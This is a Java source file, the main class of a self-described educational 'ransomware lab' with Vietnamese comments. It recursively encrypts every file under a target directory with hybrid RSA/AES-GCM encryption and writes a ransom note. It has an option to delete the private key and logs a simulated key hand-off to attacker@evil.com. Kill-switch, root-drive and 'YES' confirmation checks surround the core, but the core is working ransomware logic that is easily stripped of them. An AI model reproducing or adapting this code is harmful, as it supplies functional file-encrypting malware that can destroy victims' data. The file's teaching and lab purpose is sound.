package ransomware;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.KeyPair;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

/**
 * Main class - Mã hóa file
 */
public class Ransomware {

    private static FileWriter logWriter;
    private static int fileCount = 0;
    private static int errorCount = 0;
    private static long startTime;

    public static void main(String[] args) {
        try {
            startTime = System.currentTimeMillis();

            if (!checkSafety()) return;

            initLog();
            log("=".repeat(60));
            log("RANSOMWARE LAB - HYBRID ENCRYPTION");
            log("=".repeat(60));
            log("Target: " + Config.TARGET_DIR);
            log("Time:   " + now());

            // ===== BƯỚC 1: TẠO RSA KEY PAIR =====
            log("");
            log("[STEP 1] Tạo RSA Key Pair " + Config.RSA_KEY_SIZE + "-bit");
            KeyPair kp = CryptoUtils.generateRSAKeyPair();
            PublicKey pub = kp.getPublic();
            PrivateKey priv = kp.getPrivate();

            log("  ✓ Public Key:  " + pub.getEncoded().length + " bytes");
            log("  ✓ Private Key: " + priv.getEncoded().length + " bytes");

            CryptoUtils.savePublicKey(pub, Config.KEY_DIR + "public.key");
            CryptoUtils.savePrivateKey(priv, Config.KEY_DIR + "private.key");
            log("  ✓ Đã lưu public.key");
            log("  ✓ Đã lưu private.key");

            // ===== BƯỚC 2: MÔ PHỎNG GỬI KEY =====
            log("");
            log("[STEP 2] Mô phỏng gửi private key");
            if (Config.SIMULATE_EMAIL) {
                log("  [SIMULATED] Gửi private.key → attacker@evil.com");
            }
            if (Config.DELETE_PRIVATE_KEY) {
                new File(Config.KEY_DIR + "private.key").delete();
                log("  [!] Đã xóa private key");
            } else {
                log("  [LAB MODE] Giữ lại private key");
            }

            // ===== BƯỚC 3: MÃ HÓA =====
            log("");
            log("[STEP 3] Mã hóa file");
            File targetDir = new File(Config.TARGET_DIR);
            encryptRecursive(targetDir, pub);

            // ===== BƯỚC 4: RANSOM NOTE =====
            log("");
            log("[STEP 4] Tạo ransom note");
            createRansomNote();

            // ===== TỔNG KẾT =====
            long duration = System.currentTimeMillis() - startTime;
            log("");
            log("=".repeat(60));
            log("HOÀN THÀNH");
            log("=".repeat(60));
            log("Files encrypted: " + fileCount);
            log("AES keys used:   " + fileCount + " (1 per file)");
            log("Errors:          " + errorCount);
            log("Duration:        " + duration + " ms");
            log("=".repeat(60));

            logWriter.close();

        } catch (Exception e) {
            System.err.println("[FATAL] " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static boolean checkSafety() {
        if (new File(Config.KILL_SWITCH).exists()) {
            System.out.println("[!] KILL SWITCH detected");
            return false;
        }

        File target = new File(Config.TARGET_DIR);
        if (!target.exists() || !target.isDirectory()) {
            System.out.println("[!] Target không tồn tại: " + Config.TARGET_DIR);
            return false;
        }

        String t = Config.TARGET_DIR.replace("\\", "/");
        if (t.equals("C:/") || t.equals("/") || t.equals("D:/") ||
                t.equals("E:/") || t.equals("F:/")) {
            System.out.println("[!] NGUY HIỂM: Target là ổ root");
            return false;
        }

        System.out.println("=".repeat(60));
        System.out.println("RANSOMWARE LAB - HYBRID ENCRYPTION");
        System.out.println("=".repeat(60));
        System.out.println("Target: " + Config.TARGET_DIR);
        System.out.println("RSA:    " + Config.RSA_KEY_SIZE + "-bit");
        System.out.println("AES:    " + Config.AES_KEY_SIZE + "-bit GCM");
        System.out.println();
        System.out.print("Gõ 'YES' để tiếp tục: ");

        try {
            var br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(System.in));
            return "YES".equals(br.readLine());
        } catch (IOException e) {
            return false;
        }
    }

    private static void initLog() throws IOException {
        logWriter = new FileWriter(Config.LOG_FILE, true);
    }

    private static void log(String msg) {
        String line = "[" + now() + "] " + msg;
        System.out.println(line);
        try {
            logWriter.write(line + "\n");
            logWriter.flush();
        } catch (IOException e) {}
    }

    private static String now() {
        return LocalDateTime.now().format(
                DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
    }

    private static void encryptRecursive(File file, PublicKey pub) {
        try {
            if (Config.shouldSkip(file.getName())) return;

            if (file.isFile()) {
                try {
                    long size = file.length();
                    CryptoUtils.encryptFile(file, pub);
                    fileCount++;
                    log("  [OK] " + file.getPath() + " (" + size + " bytes)");
                } catch (Exception e) {
                    errorCount++;
                    log("  [ERR] " + file.getPath() + ": " + e.getMessage());
                }
            } else if (file.isDirectory()) {
                log("  [DIR] " + file.getPath());
                File[] children = file.listFiles();
                if (children != null) {
                    for (File child : children) {
                        encryptRecursive(child, pub);
                    }
                }
            }
        } catch (Exception e) {
            errorCount++;
            log("  [ERR] " + file.getPath() + ": " + e.getMessage());
        }
    }

    private static void createRansomNote() throws IOException {
        String note = """
            ==================================================
              YOUR FILES HAVE BEEN ENCRYPTED (LAB SIMULATION)
            ==================================================
            
            Đây là MÔ PHỎNG cho mục đích học tập.
            KHÔNG có dữ liệu thật nào bị hại.
            
            Mô hình mã hóa:
              - RSA-%d Key Pair (1 lần)
              - AES-%d key riêng cho MỖI file
              - AES-GCM + RSA-OAEP-SHA256
            
            Để giải mã (trong lab):
              1. Chạy DecryptionLab
              2. Private key ở: %sprivate.key
              3. Hoặc revert VM snapshot
            
            Files encrypted: %d
            Errors: %d
            Timestamp: %s
            ==================================================
            """.formatted(
                Config.RSA_KEY_SIZE,
                Config.AES_KEY_SIZE,
                Config.KEY_DIR,
                fileCount,
                errorCount,
                now()
        );

        Files.write(Paths.get(Config.RANSOM_NOTE),
                note.getBytes(StandardCharsets.UTF_8));
        log("  ✓ Ransom note: " + Config.RANSOM_NOTE);
    }
}